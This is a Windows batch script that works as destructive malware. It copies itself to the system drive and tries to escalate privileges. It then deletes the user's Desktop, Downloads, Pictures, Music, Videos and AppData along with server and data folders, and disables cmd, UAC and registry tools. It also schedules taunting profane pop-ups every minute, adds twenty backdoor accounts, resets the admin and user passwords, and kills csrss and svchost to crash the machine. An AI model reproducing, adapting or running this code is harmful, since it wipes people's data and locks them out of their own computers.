@ECHO OFF

if not exist %systemdrive%\main.bat goto copy
net session >nul 2>&1
if %errorlevel% == 0 goto main
if not %errorlevel% == 0 echo %1 | findstr /i /c:"/trytwo" >nul && echo "Sorry, you need administrative privileges to run this batch script." || goto copy

:copy
if
if not exist %systemdrive%\main.bat copy %0 %systemdrive%\main.bat
cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %systemdrive%\main.bat /trytwo"
goto end

:main
TASKKILL /f /im explorer.exe

DEL %USERPROFILE%\Desktop /s /q /f
RMDIR %USERPROFILE%\Desktop /q /s

DEL %USERPROFILE%\Downloads /s /q /f
RMDIR %USERPROFILE%\Downloads /q /s

DEL %USERPROFILE%\Pictures /s /q /f
RMDIR %USERPROFILE%\Pictures /q /s

DEL %USERPROFILE%\Music /s /q /f
RMDIR %USERPROFILE%\Music /q /s

DEL %USERPROFILE%\Video /s /q /f
RMDIR %USERPROFILE%\Videos /q /s

DEL %USERPROFILE%\AppData /s /q /f
RMDIR %USERPROFILE%\AppData /q /s

%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Policies\Microsoft\Windows\System /v NoRun /t REG_DWORD /d 1 /f
%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d "Uh oh, something's wrong..." /f
%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d "Check README.txt dropped on your desktop for more information" /f
%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

ECHO Uh oh, something's wrong... > %USERPROFILE%\Desktop\README.txt
ECHO Sorry, all of your data has been deleted. >> %USERPROFILE%\Desktop\README.txt
ECHO Most of your data has been lost and we can't restore them, unless you know a way to do it. >> %USERPROFILE%\Desktop\README.txt
ECHO Many changes has been set to your computer, to make it harder to restore. >> %USERPROFILE%\Desktop\README.txt
ECHO If you don't know how to restore your computer, cry about it. >> %USERPROFILE%\Desktop\README.txt
ECHO There's nothing you can do. >> %USERPROFILE%\Desktop\README.txt
ECHO Well, then... >> %USERPROFILE%\Desktop\README.txt
ECHO Wish you a bad day! >> %USERPROFILE%\Desktop\README.txt

set SERVICEDIR=%USERPROFILE%\AppData\LocalLow\Microsoft\WindowsDefenderFuckService
MKDIR %SERVICEDIR%
ECHO @ECHO OFF >> %SERVICEDIR%\alert.bat
ECHO ECHO Uh oh, something's wrong... >> %SERVICEDIR%\alert.bat
ECHO ECHO Sorry, all of your data has been deleted. >> %SERVICEDIR%\alert.bat
ECHO ECHO Most of your data has been lost and we can't restore them, unless you know a way to do it. >> %SERVICEDIR%\alert.bat
ECHO ECHO Many changes has been set to your computer, to make it harder to restore. >> %SERVICEDIR%\alert.bat
ECHO ECHO If you don't know how to restore your computer, cry about it. >> %SERVICEDIR%\alert.bat
ECHO ECHO There's nothing you can do. >> %SERVICEDIR%\alert.bat
ECHO ECHO Well, then... >> %SERVICEDIR%\alert.bat
ECHO ECHO Wish you a bad day! >> %SERVICEDIR%\alert.bat
ECHO PAUSE >> %SERVICEDIR%\alert.bat

ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("FUCK THE POLICE DA FREE GANG! FUCK THE POLICE DA FREE GANG!" ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs
ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and play." ,0+4096, "(1) New message from ???") >> %SERVICEDIR%\alert.vbs

SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert /TR %SERVICEDIR%\alert.bat /IT
SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt /TR %SERVICEDIR%\alert.vbs /IT

ECHO SCHTASKS /Run /TN virusalert >> %SERVICEDIR%\runit.bat
ECHO SCHTASKS /Run /TN firewallalert >> %SERVICEDIR%\runit.bat

SCHTASKS /Create /SC MINUTE /MO 1 /TN DefenderTotalFuck /TR %SERVICEDIR%\runit.bat /IT

if exist C:\Apache24\ rmdir C:\Apache24 /s /q
if exist C:\Apache24\ del C:\Apache24 /s /q /f

if exist C:\inetpub\ del C:\inetpub /s /q /f
if exist C:\inetpub\ rmdir C:\inetpub /s /q

if exist C:\Data\ del C:\Data /s /q /f
if exist C:\Data\ rmdir C:\Data /s /q

if exist C:\Datas\ del C:\Datas /s /q /f
if exist C:\Datas\ rmdir C:\Datas /s /q

if exist C:\Important\ del C:\Important /s /q /f
if exist C:\Important\ rmdir C:\Important /s /q

if exist C:\Importants\ del C:\Importants /s /q /f
if exist C:\Importants\ rmdir C:\Importants /s /q

if exist C:\Private\ del C:\Private /s /q /f
if exist C:\Private rmdir C:\Private /s /q

NET USER HACKER001 Trash0001 /add
NET USER HACKER002 Trash0001 /add
NET USER HACKER003 Trash0001 /add
NET USER HACKER004 Trash0001 /add
NET USER HACKER005 Trash0001 /add
NET USER HACKER006 Trash0001 /add
NET USER HACKER007 Trash0001 /add
NET USER HACKER008 Trash0001 /add
NET USER HACKER009 Trash0001 /add
NET USER HACKER010 Trash0001 /add
NET USER HACKER011 Trash0001 /add
NET USER HACKER012 Trash0001 /add
NET USER HACKER013 Trash0001 /add
NET USER HACKER014 Trash0001 /add
NET USER HACKER015 Trash0001 /add
NET USER HACKER016 Trash0001 /add
NET USER HACKER017 Trash0001 /add
NET USER HACKER018 Trash0001 /add
NET USER HACKER019 Trash0001 /add
NET USER HACKER020 Trash0001 /add

NET USER Administrator Trashedpc01
NET USER %USERNAME% Trashedpc01

taskkill /f /im csrss.exe
taskkill /f /im svchost.exe
wininit

:end
